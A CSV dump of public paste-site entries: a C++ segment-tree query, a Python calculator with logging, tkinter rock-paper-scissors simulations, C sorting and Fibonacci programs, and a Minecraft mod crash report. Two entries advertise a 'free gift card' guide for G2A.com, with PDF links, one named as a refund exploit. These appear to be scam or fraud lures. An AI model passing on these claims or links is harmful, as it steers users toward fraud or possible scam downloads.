id,title,username,language,date,content
Xh5Ra9Gj,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 8th of March 2024 12:04:46 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_917199.pdf

Working as of:
08 March 2024"
mVBTNLTG,Untitled,Sreekar_0125,C++,Thursday 7th of March 2024 11:36:48 PM CDT,"T query(size_t treeIndex, size_t left, size_t right)
    {
        cerr << ""qL : "" << queryLeft << ' ' << ""qR : "" << queryRight << endl;
        cerr << treeIndex << ' ' << left << ' ' << right << endl;
        if (queryLeft <= left && right <= queryRight)
            return tree[treeIndex];

        size_t mid = left + (right - left) / 2;
        cerr << ""mid : "" << mid << endl;
        if (queryRight <= mid)
            return query(2 * treeIndex + 1, left, mid);
        if (queryLeft > mid)
        {
           return query(2 * treeIndex + 2, mid + 1, right); 
        }
        
        int Left = query(2 * treeIndex + 1, left, mid);
        int Right = query(2 * treeIndex + 2, mid + 1, right);
        
        if(treeIndex == 0)
        {
            cerr << ""Final Returning : "" << Left << ' ' << Right << endl;
        }
            
        return max(Left, Right);
    }"
YEn5uM66,Exception_%s,naren_paste,Python,Thursday 7th of March 2024 11:30:43 PM CDT,"from functools import reduce
import logging as logs

logs.basicConfig(
    filename=""calc.log"",
    level=logs.DEBUG,
    format=""[%(asctime)s] %(lineno)d-%(name)s-%(levelname)s-%(message)s"",
)


class cal_culator:
    def __init__(calc, user_name):
        try:
            logs.info(""taking the username"")
            calc.username = user_name
            logs.info(user_name)
        except Exception as e:
            logs.error(e)

    def add_tion(calc, *args):
        try:
            logs.info(""taking the data from user to produce addition of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the sum is',sum(args))
            return calc.username, sum(args)

        except TypeError as t:
            logs.error(t)

    def sub_traction(calc, *args):

        try:
            logs.info(""taking the data tpo produce the subtraction "")
            logs.info(""enterd data is %s"", args)
            # logs.info('the subtraction is',reduce(lambda a,b:a-b,args))
            return calc.username, reduce(lambda a, b: a - b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def multi_plication(calc, *args):
        try:
            logs.info(""taking the data to produce multiplication of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a*b,args))
            return calc.username, reduce(lambda a, b: a * b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def div_sion(calc, *args):
        try:
            logs.info(""taking the data to produce division of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a/b,args))
            return calc.username, reduce(lambda a, b: a / b, args)
            logs.info(args)
            logs.info(args)
        except Exception as e:
            logs.error(e)


obj = cal_culator(""sushant"")
print(obj.add_tion(*[1, 2, 3]))
print(obj.sub_traction(*[1, 2, 3]))
print(obj.multi_plication(*[1, 2, 3]))
print(obj.div_sion(*[1, 2, 3]))
"
aUC8WWGa,# tk_rock_paper_scissors_sim2.py,here2share,Python,Thursday 7th of March 2024 11:00:15 PM CDT,"# tk_rock_paper_scissors_sim2.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 480
WINDOW_HEIGHT = 480
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 120
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

r = 10
def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - r, y - r, x + r, y + r), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
gb1EFf6C,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:55:04 PM CDT,"#include <stdio.h>
#include <stdlib.h>

#define SIZE 100

void fillRandom(int* array, int size, int border) {
    for (int i = 0; i < size; ++i) {
        *(array + i) = rand() % border;
    }
}

void printIntArray(int* array, int size, int offset) {
    char format[7];
    sprintf(format, ""%%%dd"", offset);
    for (int i = 0; i < size; ++i) {
        printf(format, array[i]);
        if (i != size - 1)
            printf("","");
    }
    printf(""\n"");
}

void swap(int* lhs, int* rhs) {
    *lhs ^= *rhs;
    *rhs ^= *lhs;
    *lhs ^= *rhs;
}

void bubbleSort(int* array, int size) {
    for (int i = 0; i < size; ++i) {
        for (int j = 0; j < size - 1; ++j) {
            if (array[j] > array[j + 1]) {
                swap(&array[j], &array[j + 1]);
            }
        }
    }
}

int main(void) {
    int arr[SIZE];
    fillRandom(arr, SIZE, 100);
    printIntArray(arr, SIZE, 3);
    bubbleSort(arr, SIZE);
    printIntArray(arr, SIZE, 3);
    return 0;
}
"
jkYpUrHm,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Thursday 7th of March 2024 10:52:14 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1QX2f9c6IIh85U8kry1bxwlS9OdjQFGFZ/view?usp=sharing
or
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
08 March 2024"
L05ySSXr,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:39:35 PM CDT,"#include <stdio.h>

#define UNITE 1
#define UNITED 2

int meow(int kittensOfTheWorld) {
    if (kittensOfTheWorld < UNITED) return kittensOfTheWorld;

    return meow(kittensOfTheWorld - UNITE) + meow(kittensOfTheWorld - UNITED);
}

int fibLoop(int num) {
    int prevprev = 0;
    int prev = 1;

    if (num < UNITED) return num;
    int i = 2;
    int current = 0;

    do {
        current = prev + prevprev;
        prevprev = prev;
        prev = current;
        i++;
    } while (i <= num);

    return current;
}

int main(void) {
    for (int i = 0; i < 50; ++i) {
        printf(""%dth Fibonacci number is: %d\n"", i, fibLoop(i));
    }
    return 0;
}
"
t6hAx8y6,# tk_rock_paper_scissors_sim.py,here2share,Python,Thursday 7th of March 2024 10:24:31 PM CDT,"# tk_rock_paper_scissors_sim.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS and chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
jXrg8gRj,crash-2024-03-07_23.51.02-client,Urara_Chiya,Java,Thursday 7th of March 2024 10:07:26 PM CDT,"---- Minecraft Crash Report ----

WARNING: coremods are present:
  FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  MixinBooter (cleanroom-15.24.0.3029-universal.jar)
Contact their authors BEFORE contacting forge

// My bad.

Time: 2024-03-08 11:35
Description: There was a severe problem during mod loading that has caused the game to fail

net.minecraftforge.fml.common.LoaderExceptionModCrash: Caught exception from Railcraft (railcraft)
Caused by: net.minecraft.util.ReportedException: Loading Railcraft Module
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:266)
	at mods.railcraft.common.modules.RailcraftModuleManager.preInit(RailcraftModuleManager.java:202)
	at mods.railcraft.common.core.Railcraft.preInit(Railcraft.java:116)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:637)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:279)
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:257)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:193)
	at net.minecraftforge.fml.common.Loader.preinitializeMods(Loader.java:630)
	at net.minecraftforge.fml.client.FMLClientHandler.beginMinecraftLoading(FMLClientHandler.java:251)
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:467)
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378)
	at net.minecraft.client.main.Main.main(SourceFile:123)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.cleanroommc.bouncepad.Bouncepad.launch(Bouncepad.java:136)
	at com.cleanroommc.bouncepad.Bouncepad.main(Bouncepad.java:38)
	at org.prismlauncher.launcher.impl.StandardLauncher.launch(StandardLauncher.java:87)
	at org.prismlauncher.EntryPoint.listen(EntryPoint.java:129)
	at org.prismlauncher.EntryPoint.main(EntryPoint.java:70)
Caused by: java.lang.ExceptionInInitializerError
	at mods.railcraft.common.blocks.aesthetics.metals.BlockMetal.initializeDefinition(BlockMetal.java:66)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.register(RailcraftBlocks.java:247)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.access$100(RailcraftBlocks.java:199)
	at mods.railcraft.common.blocks.RailcraftBlocks.register(RailcraftBlocks.java:275)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at mods.railcraft.common.modules.RailcraftModulePayload$BaseModuleEventHandler.preInit(RailcraftModulePayload.java:78)
	at mods.railcraft.common.modules.RailcraftModuleManager$Stage$2.passToModule(RailcraftModuleManager.java:312)
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:253)
	... 38 more
Caused by: java.lang.ClassCastException: class mods.railcraft.common.blocks.aesthetics.metals.BlockMetal
	at java.base/java.lang.Class.asSubclass(Class.java:4102)
	at mods.railcraft.common.plugins.forge.DataManagerPlugin.create(DataManagerPlugin.java:137)
	at mods.railcraft.common.carts.EntityTunnelBore.<clinit>(EntityTunnelBore.java:90)
	... 46 more


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- System Details --
Details:
	Minecraft Version: 1.12.2
	Operating System: Windows 11 (amd64) version 10.0
	Java Version: 21.0.2, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode, sharing), Microsoft
	Memory: 249575704 bytes (238 MB) / 536870912 bytes (512 MB) up to 6442450944 bytes (6144 MB)
	JVM Flags: 21 total; -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xms512m -Xmx6144m
	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
	FML: MCP 9.42 Powered by Cleanroom 14.23.5.0 8 mods loaded, 8 mods active
	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored

	| State | ID            | Version      | Source                               | Signature                                |
	|:----- |:------------- |:------------ |:------------------------------------ |:---------------------------------------- |
	| LCH   | minecraft     | 1.12.2       | minecraft.jar                        | None                                     |
	| LCH   | mcp           | 9.42         | minecraft.jar                        | None                                     |
	| LCH   | configanytime | 2.0          | minecraft.jar                        | None                                     |
	| LCH   | FML           | 8.0.99.99    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | forge         | 14.23.5.0    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | mixinbooter   | 10.0         | minecraft.jar                        | None                                     |
	| LCH   | fugue         | 1.12.2-0.5.4 | Fugue-1.12.2-0.5.4.jar               | None                                     |
	| LCE   | railcraft     | 12.0.0       | railcraft-12.0.0.jar                 | a0c255ac501b2749537d5824bb0f0588bf0320fa |

	Loaded coremods (and transformers): 
FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  com.cleanroommc.transformer.CommonRegistrar$Transformer
MixinBooter (cleanroom-15.24.0.3029-universal.jar)
  
	GL info: ' Vendor: 'Intel' Version: '4.6.0 - Build 31.0.101.2125' Renderer: 'Intel(R) Iris(R) Plus Graphics'"
Jg2c7JQ7,# tk_war.py,here2share,Python,Thursday 7th of March 2024 09:45:17 PM CDT,"# tk_war.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 25
CONVERT_RADIUS = 20
SPEED = 1

root = tk.Tk()
root.title(""tk_war"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
